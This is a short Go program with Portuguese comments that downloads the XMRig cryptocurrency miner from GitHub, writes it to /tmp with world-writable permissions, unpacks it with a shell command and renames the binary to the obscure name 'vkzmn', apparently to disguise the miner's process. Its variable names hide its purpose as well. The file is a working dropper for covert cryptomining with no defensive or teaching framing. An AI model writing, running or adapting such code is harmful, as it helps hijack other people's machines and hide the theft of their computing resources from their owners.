package main



import  (


"net/http"
"io/ioutil"
"fmt"
"os/exec"
//"os"
)

//funcao para abaixa o vkzmn
 

var   url_vkzmn  string  =  "https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz"


func  down_vk(){


req  := http.Client{}


resp , err_get := req.Get(url_vkzmn)


if  err_get   != nil {


fmt.Println(err_get) //tente abaixa denovo

return 

}

vkzmn_bytes  , err_readall :=  ioutil.ReadAll(resp.Body)

if err_readall != nil {

fmt.Println("erro em readall")

return 

}

ioutil.WriteFile("/tmp/vkzmn.tar.gz", vkzmn_bytes, 0777)

vk_deco_gz_tar  :=  exec.Command  (

"sh", "-c" , "cd /tmp &&  gzip -df /tmp/vkzmn.tar.gz && tar -xf /tmp/vkzmn.tar " ) //extract xmrig
  
vk_deco_gz_tar.Run()

rename :=  exec.Command("mv" , "/tmp/xmrig-6.26.0/xmrig" , "/tmp/xmrig-6.26.0/vkzmn") //rename xmrig 

rename.Run()

return 

}














